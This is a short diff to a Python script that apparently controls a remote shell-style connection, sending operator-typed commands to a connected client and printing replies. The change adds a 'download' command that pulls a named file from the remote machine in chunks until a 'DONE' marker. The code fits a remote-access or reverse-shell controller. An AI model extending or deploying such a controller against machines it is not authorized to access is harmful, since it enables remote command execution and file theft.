@@ -16,8 +16,19 @@ while True:
     output=output.decode()
     command=user_input.useruput(f'{output}: ')
     command=command.encode()
-    client.send(command)
-    # custom_output.info("[+] command sent",color.green)
-    output=client.recv(1024)
-    output=output.decode()
-    custom_output.info(f"{output}",color.blue)
+    if command.decode().split()[0]=="download":
+        client.send(command)
+        filename=command.split()[1]
+        with open(filename,'wb') as f:
+            data=client.recv(1024)
+            while data:
+                f.write(data)
+                data=client.recv(1024)
+                if data.decode()=="DONE":
+                    break
+    else:
+        client.send(command)
+        # custom_output.info("[+] command sent",color.green)
+        output=client.recv(1024)
+        output=output.decode()
+        custom_output.info(f"{output}",color.blue)
